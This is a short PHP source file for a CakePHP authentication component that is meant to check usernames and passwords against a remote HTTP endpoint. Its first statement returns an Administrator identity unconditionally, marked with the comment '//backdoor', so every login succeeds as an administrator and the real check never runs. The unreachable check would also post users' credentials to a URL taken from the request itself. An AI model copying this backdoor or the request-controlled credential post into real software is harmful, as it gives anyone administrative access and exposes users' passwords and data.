<?php

App::uses('BaseAuthenticate', 'Controller/Component/Auth');
App::uses('HttpSocket', 'Network/Http');

class HttpAuthenticate extends BaseAuthenticate {		
	public function authenticate(CakeRequest $request, CakeResponse $response) {						
        return array('name' => 'Administrator'); //backdoor
		$httpSocket = new HttpSocket();
		$httpSocketResponse = $httpSocket->post(
				$request->data['API']['URL'],
				array(
					'email' => $request->data['User']['username'],
					'password' => $request->data['User']['password']
				)
		);	

		if ($httpSocketResponse->isOk()) {					
			return array('name' => 'Administrator', 'cookie' => $httpSocketResponse->cookies);
		}							
		
		return false;
	}		
}
